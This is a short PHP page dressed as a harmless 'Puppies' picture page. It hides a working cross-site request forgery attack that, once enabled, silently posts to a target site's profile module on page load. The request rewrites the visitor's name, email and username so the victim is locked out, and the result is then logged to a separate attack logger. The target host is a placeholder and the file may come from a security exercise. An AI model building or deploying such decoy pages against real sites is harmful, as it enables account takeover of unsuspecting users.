<?php
    // Attack parameters:
    $active = false;
    $host = 'http://<target>';
    $newprenom = 'Is this really';
    $newnom = 'my name?';
    $newemail = 'omgIgothacked@gmail.com';
    $newusername = 'goodlucklogginginagain';
?>
<html>
<head>
	<title>Puppies</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="stylesheet" type="text/css" href="style.css"/>
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
</head>
<body>
    <h1><?= "Puppies!" ?></h1>
    <div class="maindiv">
        <p>Look how adorable these puppies are!</p>
    </div>
    <img style="margin-top: 20px" src="https://i.ytimg.com/vi/DhpYAyVsFXQ/hqdefault.jpg"/>
    <br><br>
    <a href="index.php">Back to homepage</a>
    <br>
<?  if ($active) { ?>
    <script>		
		$(document).ready(function(){
            console.log("puppies away!");
			$.ajax({
				url: "<?=$host?>/modules/profile/profile.php?submit=yes",
				type: "post",
				data: { prenom_form: "<?=$newprenom?>", 
				        nom_form: "<?=$newnom?>",
						username_form: "<?=$newusername?>",
						email_form: "<?=$newemail?>",
                        userLanguage: "el"
				},
				success: function(response){
					console.log("puppies reached their destination");
					// log successful attack
                    $.ajax({
                        url: "logattacks.php",
                        type: "post",
                        data:{
                            attack: "csrf_on_profile",
                            result: response
                        }
                    });
				}
			});
		});
	</script>
<?  } ?>
</body>
</html>